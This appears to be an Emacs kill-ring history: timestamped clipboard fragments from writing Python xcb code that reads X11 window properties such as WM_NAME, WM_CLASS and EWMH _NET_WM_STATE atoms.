_NET_WM_STATE_FULLSCREEN
* Sun 09 Feb 2014 09:11:33 AM JST
_NET_WM_STATE_ABOVE
* Sun 09 Feb 2014 09:11:38 AM JST
_NET_WM_STATE_BELOW
* Sun 09 Feb 2014 09:11:42 AM JST
_NET_WM_STATE_DEMANDS_ATTENTION
* Sun 09 Feb 2014 09:11:51 AM JST
_NET_WM_WINDOW_TYPE
* Sun 09 Feb 2014 09:11:59 AM JST
_NET_WM_STATE
* Sun 09 Feb 2014 09:12:08 AM JST
_NET_WM_DESKTOP
* Sun 09 Feb 2014 09:12:15 AM JST
_NET_FRAME_EXTENTS
* Sun 09 Feb 2014 09:12:54 AM JST
_NET_WM_STATE_DEMANDS_ATTENTION
* Sun 09 Feb 2014 09:13:26 AM JST
_NET_WM_PID
* Sun 09 Feb 2014 09:16:05 AM JST
    _MODE_UNSET = 0
    _MODE_SET = 1
    _MODE_TOGGLE = 2

* Sun 09 Feb 2014 09:17:04 AM JST
_NET_WM_STATE_MODAL
_NET_WM_STATE_STICKY
_NET_WM_STATE_MAXIMIZED_VERT
_NET_WM_STATE_MAXIMIZED_HORZ
_NET_WM_STATE_SHADED
_NET_WM_STATE_SKIP_TASKBAR
_NET_WM_STATE_SKIP_PAGER
_NET_WM_STATE_HIDDEN
_NET_WM_STATE_FULLSCREEN
_NET_WM_STATE_ABOVE
_NET_WM_STATE_BELOW
_NET_WM_STATE_DEMANDS_ATTENTION
_NET_WM_WINDOW_TYPE
_NET_WM_STATE
_NET_WM_DESKTOP
_NET_FRAME_EXTENTS
_NET_WM_STATE_DEMANDS_ATTENTION
_NET_WM_PID

* Sun 09 Feb 2014 09:17:45 AM JST
get_net_wm_state_modal
get_net_wm_state_sticky
get_net_wm_state_maximized_vert
get_net_wm_state_maximized_horz
get_net_wm_state_shaded
get_net_wm_state_skip_taskbar
get_net_wm_state_skip_pager
get_net_wm_state_hidden
get_net_wm_state_fullscreen
get_net_wm_state_above
get_net_wm_state_below
get_net_wm_state_demands_attention
get_net_wm_window_type
get_net_wm_state
get_net_wm_desktop
get_net_frame_extents
get_net_wm_state_demands_attention
get_net_wm_pid
* Sun 09 Feb 2014 09:39:54 AM JST
window
* Sun 09 Feb 2014 09:42:02 AM JST
rid, 
* Sun 09 Feb 2014 09:42:12 AM JST
    def __cmp__(self, obj):
        if isinstance(obj, Resource):
            if self.display == obj.display:
                return cmp(self.id, obj.id)
            else:
                return cmp(self.display, obj.display)
        else:
            return cmp(id(self), id(obj))

* Sun 09 Feb 2014 09:42:22 AM JST
display
* Sun 09 Feb 2014 09:42:27 AM JST
display
* Sun 09 Feb 2014 09:42:49 AM JST
display
* Sun 09 Feb 2014 09:42:55 AM JST
display
* Sun 09 Feb 2014 09:43:07 AM JST
    def __hash__(self):
        return int(self.id)

* Sun 09 Feb 2014 09:43:12 AM JST
id
* Sun 09 Feb 2014 09:43:38 AM JST
    def __str__(self):
        return '%s(0x%08x)' % (self.__class__, self.id)

    def __repr__(self):
        return '<%s 0x%08x>' % (self.__class__, self.id)

* Sun 09 Feb 2014 09:43:42 AM JST
id
* Sun 09 Feb 2014 09:43:44 AM JST
id
* Sun 09 Feb 2014 09:58:26 AM JST
self, 
* Sun 09 Feb 2014 09:58:41 AM JST
window, 
* Sun 09 Feb 2014 09:58:44 AM JST
window, 
* Sun 09 Feb 2014 09:59:25 AM JST
                        
* Sun 09 Feb 2014 10:01:01 AM JST
ChangeProperty?
* Sun 09 Feb 2014 10:05:10 AM JST
GetPropertyUnchecked
* Sun 09 Feb 2014 10:10:56 AM JST
DeleteProperty?
* Sun 09 Feb 2014 10:15:08 AM JST
return
* Sun 09 Feb 2014 05:14:41 PM JST
rid, connection, owner=0
* Sun 09 Feb 2014 05:15:10 PM JST
rid, 
* Sun 09 Feb 2014 05:15:36 PM JST
    
* Sun 09 Feb 2014 05:19:42 PM JST
        reply = self._connection.GetProperty(delete, self, property_, type_,
                                            long_offset, long_length).reply()

* Sun 09 Feb 2014 05:20:41 PM JST
long_
* Sun 09 Feb 2014 05:20:44 PM JST
long_
* Sun 09 Feb 2014 05:20:48 PM JST
                                             
* Sun 09 Feb 2014 11:10:53 PM JST

* Sun 09 Feb 2014 11:10:54 PM JST

* Sun 09 Feb 2014 11:10:54 PM JST
        self._connection = connection

* Sun 09 Feb 2014 11:10:55 PM JST
        self._connection = connection

* Sun 09 Feb 2014 11:10:56 PM JST
        self._connection = connection
        self._window_id = window_id

* Sun 09 Feb 2014 11:17:28 PM JST

* Sun 09 Feb 2014 11:17:28 PM JST

* Sun 09 Feb 2014 11:17:28 PM JST
        self._connection = connection

* Sun 09 Feb 2014 11:17:28 PM JST
        self._connection = connection

* Sun 09 Feb 2014 11:17:28 PM JST
        self._connection = connection
        self._window_id = window_id

* Sun 09 Feb 2014 11:17:30 PM JST

* Sun 09 Feb 2014 11:17:30 PM JST

* Sun 09 Feb 2014 11:17:30 PM JST
        self._offset = offset

* Sun 09 Feb 2014 11:17:30 PM JST
        self._offset = offset

* Sun 09 Feb 2014 11:17:30 PM JST
        self._offset = offset
        self._length = length

* Sun 09 Feb 2014 11:23:33 PM JST
self._window_id
* Sun 09 Feb 2014 11:48:24 PM JST
PropertyWindow
* Sun 09 Feb 2014 11:50:23 PM JST
ListProperties
* Sun 09 Feb 2014 11:57:01 PM JST
            
* Sun 09 Feb 2014 11:57:45 PM JST
        reply = self._connection.core.GetProperty(
            delete, self._window_id, self._property, self._type,
            self._offset, self._length).reply()
        return reply

* Mon 10 Feb 2014 12:00:10 AM JST
delete=
* Mon 10 Feb 2014 12:02:17 AM JST
None
* Mon 10 Feb 2014 12:02:17 AM JST
onerror=None
* Mon 10 Feb 2014 12:02:29 AM JST
cccccc
* Mon 10 Feb 2014 04:59:41 AM JST
    
* Mon 10 Feb 2014 05:01:11 AM JST

* Mon 10 Feb 2014 05:01:11 AM JST

* Mon 10 Feb 2014 05:01:11 AM JST
        self._connection = connection

* Mon 10 Feb 2014 05:01:11 AM JST
        self._connection = connection

* Mon 10 Feb 2014 05:01:11 AM JST
        self._connection = connection
        self._window_id = window_id

* Mon 10 Feb 2014 05:12:19 AM JST

* Mon 10 Feb 2014 05:12:19 AM JST

* Mon 10 Feb 2014 05:12:19 AM JST
        self._property = property_

* Mon 10 Feb 2014 05:14:47 AM JST
DeleteProperty?
* Mon 10 Feb 2014 05:17:41 AM JST
GetProperty?
* Mon 10 Feb 2014 05:18:37 AM JST
_connetcion
* Mon 10 Feb 2014 05:19:48 AM JST
_data
* Mon 10 Feb 2014 05:19:57 AM JST
self.
* Mon 10 Feb 2014 05:25:06 AM JST
self, 
* Mon 10 Feb 2014 05:42:29 AM JST
object
* Mon 10 Feb 2014 05:42:34 AM JST
Resource
* Mon 10 Feb 2014 05:51:29 AM JST
raise NotImplementedError()
* Mon 10 Feb 2014 06:03:34 AM JST
get_secondary
get_cut_buffer0
get_cut_buffer1
get_cut_buffer2
get_cut_buffer3
get_cut_buffer4
get_cut_buffer5
get_cut_buffer6
get_cut_buffer7
get_wm_class
get_wm_client_machine
get_wm_colormap_windows
get_wm_command
get_wm_hints
get_wm_icon_name
get_wm_icon_size
get_wm_name
get_wm_normal_hints
get_wm_protocols
get_wm_state
get_wm_transient_for
get_zoom_hints
get_RGB_BEST_MAP
get_RGB_BLUE_MAP
get_RGB_DEFAULT_MAP
get_RGB_GRAY_MAP
get_RGB_GREEN_MAP
get_RGB_RED_MAP
get_resource_manager
* Mon 10 Feb 2014 06:07:15 AM JST
raise NotImplementedError()
* Mon 10 Feb 2014 06:11:41 AM JST
set_NET_SUPPORTED
set_NET_CLIENT_LIST
set_NET_CLIENT_LIST_STACKING
set_NET_NUMBER_OF_DESKTOPS
set_NET_WORKAREA
set_NET_VIRTUAL_ROOTS
set_NET_DESKTOP_NAMES
set_NET_CURRENT_DESKTOP
set_NET_WM_DESKTOP
set_NET_DESKTOP_GEOMETRY
set_NET_ACTIVE_WINDOW
set_NET_WM_USER_TIME
set_NET_SUPPORTING_WM_CHECK
get_NET_SUPPORTED
get_NET_CLIENT_LIST
get_NET_CLIENT_LIST_STACKING
get_NET_NUMBER_OF_DESKTOPS
get_NET_WORKAREA
get_NET_VIRTUAL_ROOTS
get_NET_DESKTOP_NAMES
get_NET_CURRENT_DESKTOP
get_NET_WM_DESKTOP
get_NET_DESKTOP_GEOMETRY
get_NET_ACTIVE_WINDOW
get_NET_WM_USER_TIME
get_NET_SUPPORTING_WM_CHECK
* Mon 10 Feb 2014 06:12:03 AM JST
raise NotImplementedError()
* Mon 10 Feb 2014 06:14:20 AM JST
get_net_wm_state_modal
get_net_wm_state_sticky
get_net_wm_state_maximized_vert
get_net_wm_state_maximized_horz
get_net_wm_state_shaded
get_net_wm_state_skip_taskbar
get_net_wm_state_skip_pager
get_net_wm_state_hidden
get_net_wm_state_fullscreen
get_net_wm_state_above
get_net_wm_state_below
get_net_wm_state_demands_attention
get_net_wm_window_type
get_net_wm_state
get_net_wm_desktop
get_net_frame_extents
get_net_wm_state_demands_attention
get_net_wm_pid
* Mon 10 Feb 2014 06:14:28 AM JST
raise NotImplementedError()
* Mon 10 Feb 2014 07:17:12 AM JST
list_properties
* Mon 10 Feb 2014 07:17:59 AM JST
_window
* Mon 10 Feb 2014 07:18:36 AM JST
value
* Mon 10 Feb 2014 07:19:20 AM JST
return 
* Mon 10 Feb 2014 07:24:58 AM JST
reply()
* Mon 10 Feb 2014 07:24:58 AM JST
id).reply()
* Mon 10 Feb 2014 07:24:59 AM JST
acwin.id).reply()
* Mon 10 Feb 2014 07:24:59 AM JST
ListProperties(acwin.id).reply()
* Mon 10 Feb 2014 07:36:07 AM JST
CUT_BUFFER0
* Mon 10 Feb 2014 07:36:15 AM JST
'_NET_WM_NAME'
* Mon 10 Feb 2014 07:37:14 AM JST
prop
* Mon 10 Feb 2014 07:37:15 AM JST
struct_prop
* Mon 10 Feb 2014 07:37:15 AM JST
get_struct_prop
* Mon 10 Feb 2014 07:37:16 AM JST
_get_struct_prop
* Mon 10 Feb 2014 07:46:08 AM JST
reply
* Mon 10 Feb 2014 07:46:15 AM JST

* Mon 10 Feb 2014 07:46:15 AM JST

* Mon 10 Feb 2014 07:46:15 AM JST
        # TODO: (Atami) [2014/02/10]

* Mon 10 Feb 2014 07:54:40 AM JST

* Mon 10 Feb 2014 07:54:40 AM JST

* Mon 10 Feb 2014 07:54:40 AM JST
        return None

* Mon 10 Feb 2014 07:58:13 AM JST
_property
* Mon 10 Feb 2014 07:58:13 AM JST
self._property
* Mon 10 Feb 2014 07:59:41 AM JST
self._length
* Mon 10 Feb 2014 08:00:30 AM JST
return
* Mon 10 Feb 2014 08:01:09 AM JST

* Mon 10 Feb 2014 08:01:09 AM JST

* Mon 10 Feb 2014 08:01:10 AM JST
        # TODO: (Atami) [2014/02/10]

* Mon 10 Feb 2014 08:01:10 AM JST
        # TODO: (Atami) [2014/02/10]

* Mon 10 Feb 2014 08:01:10 AM JST
        # TODO: (Atami) [2014/02/10]
        return None

* Mon 10 Feb 2014 08:15:59 AM JST

* Mon 10 Feb 2014 08:16:00 AM JST

* Mon 10 Feb 2014 08:16:00 AM JST
        return None

* Mon 10 Feb 2014 08:16:03 AM JST
reply = 
* Mon 10 Feb 2014 08:21:21 AM JST
core.RotateProperties
* Mon 10 Feb 2014 08:21:49 AM JST

* Mon 10 Feb 2014 08:21:49 AM JST

* Mon 10 Feb 2014 08:21:49 AM JST
        # TODO: (Atami) [2014/02/10]

* Mon 10 Feb 2014 08:21:53 AM JST
reply = 
* Mon 10 Feb 2014 08:21:55 AM JST

* Mon 10 Feb 2014 08:21:55 AM JST

* Mon 10 Feb 2014 08:21:55 AM JST
        return None

* Mon 10 Feb 2014 08:36:14 AM JST

* Mon 10 Feb 2014 08:36:14 AM JST

* Mon 10 Feb 2014 08:36:14 AM JST
        value = prop.value.buf()

* Mon 10 Feb 2014 08:36:53 AM JST
.buf()
* Mon 10 Feb 2014 08:38:06 AM JST

* Mon 10 Feb 2014 08:38:07 AM JST

* Mon 10 Feb 2014 08:38:07 AM JST
        # TODO: (Atami) [2014/02/10]

* Mon 10 Feb 2014 08:40:10 AM JST
import 
* Mon 10 Feb 2014 08:45:47 AM JST
Any
* Mon 10 Feb 2014 08:46:32 AM JST
'UTF8_STRING'
* Mon 10 Feb 2014 08:47:21 AM JST
c.core.InternAtom(False, len('UTF8_STRING'), 'UTF8_STRING')
* Mon 10 Feb 2014 08:47:37 AM JST
c.core.InternAtom(False, len('UTF8_STRING'), 'UTF8_STRING').reply().atom
* Mon 10 Feb 2014 08:48:16 AM JST
get_full
* Mon 10 Feb 2014 08:50:24 AM JST
c.core.InternAtom(False, len('UTF8_STRING'), 'UTF8_STRING')
* Mon 10 Feb 2014 08:50:30 AM JST
c.core.InternAtom(False, len('UTF8_STRING'), 'UTF8_STRING').reply().atom
* Mon 10 Feb 2014 08:50:38 AM JST
UTF8_STRING
* Mon 10 Feb 2014 08:50:46 AM JST
'_NET_WM_NAME'
* Mon 10 Feb 2014 08:52:49 AM JST
False
* Mon 10 Feb 2014 08:52:53 AM JST
False
* Mon 10 Feb 2014 08:56:12 AM JST
vlaue_len
* Mon 10 Feb 2014 08:58:09 AM JST
p=a._window.get_full_property(NET_WM_NAME, UTF8_STRING)
* Mon 10 Feb 2014 09:04:04 AM JST
sleep(5);a=wm.active.ActiveWindow()
* Mon 10 Feb 2014 09:11:36 AM JST
../../../../share/pyshared/xcb/
* Mon 10 Feb 2014 09:13:24 AM JST
str(
* Mon 10 Feb 2014 09:25:04 AM JST

* Mon 10 Feb 2014 09:25:04 AM JST

* Mon 10 Feb 2014 09:25:04 AM JST
        return None

* Mon 10 Feb 2014 09:29:36 AM JST
PropertyHandler
* Mon 10 Feb 2014 09:33:23 AM JST
value
* Mon 10 Feb 2014 09:34:06 AM JST
value.
* Mon 10 Feb 2014 09:35:08 AM JST
        prop = PropertyHandler(
            self._connection, self,
            xcb.xproto.Atom.PRIMARY, xcb.xproto.Atom.Any)

* Mon 10 Feb 2014 09:35:17 AM JST
PRIMARY
* Mon 10 Feb 2014 09:35:21 AM JST
Any
* Mon 10 Feb 2014 09:36:22 AM JST

* Mon 10 Feb 2014 09:36:22 AM JST

* Mon 10 Feb 2014 09:36:22 AM JST
        raise NotImplementedError()

* Mon 10 Feb 2014 09:37:02 AM JST
PropertyNormal
* Mon 10 Feb 2014 09:39:13 AM JST
int
* Mon 10 Feb 2014 09:42:05 AM JST
        prop = PropertyHandler(
            self._connection, self.id,
            xcb.xproto.Atom.PRIMARY, xcb.xproto.Atom.Any)
        reply = prop.get_property()
        if reply.value_len:
            return str(reply.value.buf())
        return None

* Mon 10 Feb 2014 09:42:12 AM JST
PRIMARY
* Mon 10 Feb 2014 09:42:19 AM JST
Secon
* Mon 10 Feb 2014 09:42:30 AM JST
Any
* Mon 10 Feb 2014 09:42:35 AM JST
Any
* Mon 10 Feb 2014 09:44:10 AM JST
        prop = PropertyHandler(
            self._connection, self.id,
            xcb.xproto.Atom.WM_NAME, xcb.xproto.Atom.STRING)
        reply = prop.get_property()
        if reply.value_len:
            return str(reply.value.buf())
        return None

* Mon 10 Feb 2014 09:44:14 AM JST

* Mon 10 Feb 2014 09:44:14 AM JST

* Mon 10 Feb 2014 09:44:14 AM JST
        raise NotImplementedError()

* Mon 10 Feb 2014 09:44:19 AM JST
WM_NAME
* Mon 10 Feb 2014 09:44:42 AM JST
xcb.xproto.Atom
* Mon 10 Feb 2014 09:45:04 AM JST
        prop = PropertyHandler(
            self._connection, self.id,
            xcb.xproto.Atom.WM_CLASS, xcb.xproto.Atom.STRING)
        reply = prop.get_property()
        if reply.value_len:
            return str(reply.value.buf())
        return None

* Mon 10 Feb 2014 09:45:07 AM JST

* Mon 10 Feb 2014 09:45:07 AM JST

* Mon 10 Feb 2014 09:45:07 AM JST
        raise NotImplementedError()

* Mon 10 Feb 2014 09:45:37 AM JST
        prop = PropertyHandler(
            self._connection, self.id,
            xcb.xproto.Atom.WM_CLIENT_MACHINE, xcb.xproto.Atom.STRING)
        reply = prop.get_property()
        if reply.value_len:
            return str(reply.value.buf())
        return None

* Mon 10 Feb 2014 09:45:43 AM JST

* Mon 10 Feb 2014 09:45:43 AM JST

* Mon 10 Feb 2014 09:45:43 AM JST
        raise NotImplementedError()

* Mon 10 Feb 2014 09:48:34 AM JST
        prop = PropertyHandler(
            self._connection, self.id,
            xcb.xproto.Atom.WM_NAME, xcb.xproto.Atom.STRING)
        reply = prop.get_property()
        if reply.value_len:
            return str(reply.value.buf())
        return None

* Mon 10 Feb 2014 09:48:40 AM JST

* Mon 10 Feb 2014 09:48:40 AM JST

* Mon 10 Feb 2014 09:48:40 AM JST
        raise NotImplementedError()

* Mon 10 Feb 2014 09:48:45 AM JST
WM_NAME
* Mon 10 Feb 2014 09:51:06 AM JST
type
* Mon 10 Feb 2014 09:51:30 AM JST
xcb.xproto.Atom.STRING
* Mon 10 Feb 2014 09:53:43 AM JST
STRING
* Mon 10 Feb 2014 09:55:09 AM JST
str
* Mon 10 Feb 2014 09:55:41 AM JST
WM_HINTS
* Mon 10 Feb 2014 09:56:37 AM JST
WM_COMMAND
* Mon 10 Feb 2014 09:56:39 AM JST
STRING
* Mon 10 Feb 2014 10:07:25 AM JST
prop = PropertyHandler(
            self._connection, self.id,
            xcb.xproto.Atom.WM_CLIENT_MACHINE, xcb.xproto.Atom.STRING)
        reply = prop.get_property()
        if reply.value_len:
            return str(reply.value.buf())
        return None
* Mon 10 Feb 2014 10:07:28 AM JST
        prop = PropertyHandler(
            self._connection, self.id,
            xcb.xproto.Atom.WM_CLIENT_MACHINE, xcb.xproto.Atom.STRING)
        reply = prop.get_property()
        if reply.value_len:
            return str(reply.value.buf())
        return None

* Mon 10 Feb 2014 10:07:59 AM JST
COLORMAP
* Mon 10 Feb 2014 10:08:04 AM JST
STRING
* Mon 10 Feb 2014 10:08:08 AM JST

* Mon 10 Feb 2014 10:08:08 AM JST

* Mon 10 Feb 2014 10:08:08 AM JST
        raise NotImplementedError()

* Mon 10 Feb 2014 10:08:25 AM JST

* Mon 10 Feb 2014 10:08:25 AM JST

* Mon 10 Feb 2014 10:08:25 AM JST
            print('DEBUG-1-window.py')

* Mon 10 Feb 2014 10:08:39 AM JST
CUT_BUFFER0
* Mon 10 Feb 2014 10:09:15 AM JST
        prop = PropertyHandler(
            self._connection, self.id,
            xcb.xproto.Atom.WM_CLASS, xcb.xproto.Atom.STRING)
        reply = prop.get_property()
        if reply.value_len:
            return str(reply.value.buf())
        return None

* Mon 10 Feb 2014 10:09:25 AM JST
WM_CLASS
* Mon 10 Feb 2014 10:09:31 AM JST
STRING
* Mon 10 Feb 2014 10:09:46 AM JST
        prop = PropertyHandler(
            self._connection, self.id,
            xcb.xproto.Atom.CUT_BUFFER0, xcb.xproto.Atom.Any)
        reply = prop.get_property()
        if reply.value_len:
            # TODO: (Atami) [2014/02/10]
            return str(reply.value.buf())
        return None

* Mon 10 Feb 2014 10:09:49 AM JST

* Mon 10 Feb 2014 10:09:49 AM JST

* Mon 10 Feb 2014 10:09:49 AM JST
        raise NotImplementedError()

* Mon 10 Feb 2014 10:10:03 AM JST
        prop = PropertyHandler(
            self._connection, self.id,
            xcb.xproto.Atom.CUT_BUFFER0, xcb.xproto.Atom.Any)
        reply = prop.get_property()
        if reply.value_len:
            # TODO: (Atami) [2014/02/10]
            return str(reply.value.buf())
        return None

* Mon 10 Feb 2014 10:10:18 AM JST

* Mon 10 Feb 2014 10:10:19 AM JST

* Mon 10 Feb 2014 10:10:19 AM JST
        raise NotImplementedError()

* Mon 10 Feb 2014 10:10:31 AM JST
        prop = PropertyHandler(
            self._connection, self.id,
            xcb.xproto.Atom.CUT_BUFFER0, xcb.xproto.Atom.Any)
        reply = prop.get_property()
        if reply.value_len:
            # TODO: (Atami) [2014/02/10]
            return str(reply.value.buf())
        return None

* Mon 10 Feb 2014 10:10:37 AM JST

* Mon 10 Feb 2014 10:10:37 AM JST

* Mon 10 Feb 2014 10:10:37 AM JST
        raise NotImplementedError()

* Mon 10 Feb 2014 10:10:51 AM JST
        prop = PropertyHandler(
            self._connection, self.id,
            xcb.xproto.Atom.CUT_BUFFER0, xcb.xproto.Atom.Any)
        reply = prop.get_property()
        if reply.value_len:
            # TODO: (Atami) [2014/02/10]
            return str(reply.value.buf())
        return None

* Mon 10 Feb 2014 10:10:52 AM JST

* Mon 10 Feb 2014 10:10:52 AM JST

* Mon 10 Feb 2014 10:10:52 AM JST
        raise NotImplementedError()

* Mon 10 Feb 2014 10:11:05 AM JST
        prop = PropertyHandler(
            self._connection, self.id,
            xcb.xproto.Atom.CUT_BUFFER0, xcb.xproto.Atom.Any)
        reply = prop.get_property()
        if reply.value_len:
            # TODO: (Atami) [2014/02/10]
            return str(reply.value.buf())
        return None

* Mon 10 Feb 2014 10:11:07 AM JST

* Mon 10 Feb 2014 10:11:07 AM JST

* Mon 10 Feb 2014 10:11:07 AM JST
        raise NotImplementedError()

* Mon 10 Feb 2014 10:11:21 AM JST
        prop = PropertyHandler(
            self._connection, self.id,
            xcb.xproto.Atom.CUT_BUFFER0, xcb.xproto.Atom.Any)
        reply = prop.get_property()
        if reply.value_len:
            # TODO: (Atami) [2014/02/10]
            return str(reply.value.buf())
        return None

* Mon 10 Feb 2014 10:11:23 AM JST

* Mon 10 Feb 2014 10:11:23 AM JST

* Mon 10 Feb 2014 10:11:23 AM JST
        raise NotImplementedError()

* Mon 10 Feb 2014 10:12:10 AM JST
CUT_BUFFER0
* Mon 10 Feb 2014 10:12:21 AM JST
RGB_BLUE_MAP
* Mon 10 Feb 2014 10:16:54 AM JST
        prop = PropertyHandler(
            self._connection, self.id,
            xcb.xproto.Atom.WM_HINTS, xcb.xproto.Atom.WM_HINTS)
        reply = prop.get_property()
        if reply.value_len:
            return list(reply.value.buf())
        return None

* Mon 10 Feb 2014 10:16:59 AM JST

* Mon 10 Feb 2014 10:16:59 AM JST

* Mon 10 Feb 2014 10:16:59 AM JST
        raise NotImplementedError()

* Mon 10 Feb 2014 10:17:02 AM JST
WM_HINTS
* Mon 10 Feb 2014 10:17:09 AM JST
WM_HINTS
* Mon 10 Feb 2014 10:17:24 AM JST
        prop = PropertyHandler(
            self._connection, self.id,
            xcb.xproto.Atom.WM_ICON_NAME, xcb.xproto.Atom.Any)
        reply = prop.get_property()
        if reply.value_len:
            return list(reply.value.buf())
        return None

* Mon 10 Feb 2014 10:17:29 AM JST

* Mon 10 Feb 2014 10:17:29 AM JST

* Mon 10 Feb 2014 10:17:29 AM JST
        raise NotImplementedError()

* Mon 10 Feb 2014 10:18:27 AM JST
        prop = PropertyHandler(
            self._connection, self.id,
            xcb.xproto.Atom.WM_NAME, xcb.xproto.Atom.STRING)
        reply = prop.get_property()
        if reply.value_len:
            return str(reply.value.buf())
        return None
* Mon 10 Feb 2014 10:18:32 AM JST

* Mon 10 Feb 2014 10:18:32 AM JST

* Mon 10 Feb 2014 10:18:32 AM JST
        raise NotImplementedError()

* Mon 10 Feb 2014 10:18:43 AM JST
STRING
* Mon 10 Feb 2014 10:19:28 AM JST
        prop = PropertyHandler(
            self._connection, self.id,
            xcb.xproto.Atom.WM_NORMAL_HINTS, xcb.xproto.Atom.Any)
        reply = prop.get_property()
        if reply.value_len:
            # TODO: (Atami) [2014/02/10]
            return str(reply.value.buf())
        return None        

* Mon 10 Feb 2014 10:19:30 AM JST

* Mon 10 Feb 2014 10:19:30 AM JST

* Mon 10 Feb 2014 10:19:30 AM JST
        raise NotImplementedError()

* Mon 10 Feb 2014 10:21:15 AM JST
        prop = PropertyHandler(
            self._connection, self.id,
            xcb.xproto.Atom.WM_NORMAL_HINTS, xcb.xproto.Atom.Any)
        reply = prop.get_property()
        if reply.value_len:
            # TODO: (Atami) [2014/02/10]
            return str(reply.value.buf())
        return None        

* Mon 10 Feb 2014 10:21:20 AM JST

* Mon 10 Feb 2014 10:21:21 AM JST

* Mon 10 Feb 2014 10:21:21 AM JST
        raise NotImplementedError()

* Mon 10 Feb 2014 10:21:25 AM JST
WM_NORMAL_HINTS
* Mon 10 Feb 2014 10:21:46 AM JST
        prop = PropertyHandler(
            self._connection, self.id,
            xcb.xproto.Atom.WM_NORMAL_HINTS, xcb.xproto.Atom.Any)
        reply = prop.get_property()
        if reply.value_len:
            # TODO: (Atami) [2014/02/10]
            return str(reply.value.buf())
        return None        

* Mon 10 Feb 2014 10:21:48 AM JST

* Mon 10 Feb 2014 10:21:48 AM JST

* Mon 10 Feb 2014 10:21:48 AM JST
        raise NotImplementedError()

* Mon 10 Feb 2014 10:21:57 AM JST
WM_NORMAL_HINTS
* Mon 10 Feb 2014 10:22:09 AM JST
        prop = PropertyHandler(
            self._connection, self.id,
            xcb.xproto.Atom.WM_ZOOM_HINTS, xcb.xproto.Atom.Any)
        reply = prop.get_property()
        if reply.value_len:
            # TODO: (Atami) [2014/02/10]
            return str(reply.value.buf())
        return None        

* Mon 10 Feb 2014 10:22:11 AM JST

* Mon 10 Feb 2014 10:22:11 AM JST

* Mon 10 Feb 2014 10:22:11 AM JST
        raise NotImplementedError()

* Mon 10 Feb 2014 10:22:19 AM JST
WM_ZOOM_HINTS
* Mon 10 Feb 2014 10:22:40 AM JST
        prop = PropertyHandler(
            self._connection, self.id,
            xcb.xproto.Atom.RGB_BEST_MAP, xcb.xproto.Atom.Any)
        reply = prop.get_property()
        if reply.value_len:
            # TODO: (Atami) [2014/02/10]
            return str(reply.value.buf())
        return None

* Mon 10 Feb 2014 10:23:01 AM JST

* Mon 10 Feb 2014 10:23:01 AM JST

* Mon 10 Feb 2014 10:23:01 AM JST
        raise NotImplementedError()

* Mon 10 Feb 2014 10:23:24 AM JST
        prop = PropertyHandler(
            self._connection, self.id,
            xcb.xproto.Atom.RGB_BEST_MAP, xcb.xproto.Atom.Any)
        reply = prop.get_property()
        if reply.value_len:
            # TODO: (Atami) [2014/02/10]
            return str(reply.value.buf())
        return None

* Mon 10 Feb 2014 10:23:25 AM JST

* Mon 10 Feb 2014 10:23:25 AM JST

* Mon 10 Feb 2014 10:23:25 AM JST
        raise NotImplementedError()

* Mon 10 Feb 2014 10:23:42 AM JST
        prop = PropertyHandler(
            self._connection, self.id,
            xcb.xproto.Atom.RGB_BEST_MAP, xcb.xproto.Atom.Any)
        reply = prop.get_property()
        if reply.value_len:
            # TODO: (Atami) [2014/02/10]
            return str(reply.value.buf())
        return None

* Mon 10 Feb 2014 10:23:43 AM JST

* Mon 10 Feb 2014 10:23:43 AM JST

* Mon 10 Feb 2014 10:23:43 AM JST
        raise NotImplementedError()

* Mon 10 Feb 2014 10:23:59 AM JST
        prop = PropertyHandler(
            self._connection, self.id,
            xcb.xproto.Atom.RGB_BEST_MAP, xcb.xproto.Atom.Any)
        reply = prop.get_property()
        if reply.value_len:
            # TODO: (Atami) [2014/02/10]
            return str(reply.value.buf())
        return None

* Mon 10 Feb 2014 10:24:00 AM JST

* Mon 10 Feb 2014 10:24:00 AM JST

* Mon 10 Feb 2014 10:24:01 AM JST
        raise NotImplementedError()

* Mon 10 Feb 2014 10:24:45 AM JST
RESOURCE_MANAGER
* Mon 10 Feb 2014 10:24:49 AM JST
        prop = PropertyHandler(
            self._connection, self.id,
            xcb.xproto.Atom.RGB_BEST_MAP, xcb.xproto.Atom.Any)
        reply = prop.get_property()
        if reply.value_len:
            # TODO: (Atami) [2014/02/10]
            return str(reply.value.buf())
        return None

* Mon 10 Feb 2014 10:25:00 AM JST
RESOURCE_MANAGER
* Mon 10 Feb 2014 10:30:03 AM JST
RGB_BLUE_MAP
* Mon 10 Feb 2014 10:35:26 AM JST
c.core.InternAtom(True, len('_NET_WM_NAME')
* Mon 10 Feb 2014 10:36:20 AM JST
402
* Mon 10 Feb 2014 10:37:37 AM JST
ytpe
* Mon 10 Feb 2014 10:38:39 AM JST
'_NET_WM_STATE_MAXIMIZED_VERT'
* Mon 10 Feb 2014 11:06:52 PM JST
sleep(5);a=wm.active.ActiveWindow()
* Mon 10 Feb 2014 11:08:14 PM JST
_STATE_MAXIMIZED_HORZ
* Mon 10 Feb 2014 11:10:37 PM JST
'_NET_WM_STATE_MAXIMIZED_VERT'
* Mon 10 Feb 2014 11:12:50 PM JST
'_NET_WM_STATE'
* Mon 10 Feb 2014 11:16:52 PM JST
id
* Mon 10 Feb 2014 11:16:53 PM JST
_window
* Mon 10 Feb 2014 11:17:25 PM JST
title
* Mon 10 Feb 2014 11:17:40 PM JST
title
* Mon 10 Feb 2014 11:20:22 PM JST
print 
* Mon 10 Feb 2014 11:22:01 PM JST
_NET_WM_STATE_MAXIMIZED_VERT
* Mon 10 Feb 2014 11:22:17 PM JST
_NET_
* Mon 10 Feb 2014 11:22:29 PM JST
_STATE_MAXIMIZED_VERT
* Mon 10 Feb 2014 11:26:51 PM JST
'_NET_WM_STATE'
* Mon 10 Feb 2014 11:43:11 PM JST
vlaue.
* Mon 10 Feb 2014 11:43:31 PM JST
type
* Mon 10 Feb 2014 11:48:37 PM JST
/list 
* Mon 10 Feb 2014 11:55:24 PM JST
_NET_WM_STATE
* Tue 11 Feb 2014 12:03:02 AM JST
http://standards.freedesktop.org/wm-spec/wm-spec-latest.html#idp6328192
* Tue 11 Feb 2014 12:07:28 AM JST
emacs._WM_STATE
* Tue 11 Feb 2014 12:12:17 AM JST
'_NET_WM_STATE_MAXIMIZED_VERT'
* Tue 11 Feb 2014 12:12:44 AM JST
301
* Tue 11 Feb 2014 12:13:00 AM JST
buf()
* Tue 11 Feb 2014 12:14:03 AM JST
/list 
* Tue 11 Feb 2014 12:14:20 AM JST
struct.unpack('IIII', 
* Tue 11 Feb 2014 12:15:05 AM JST
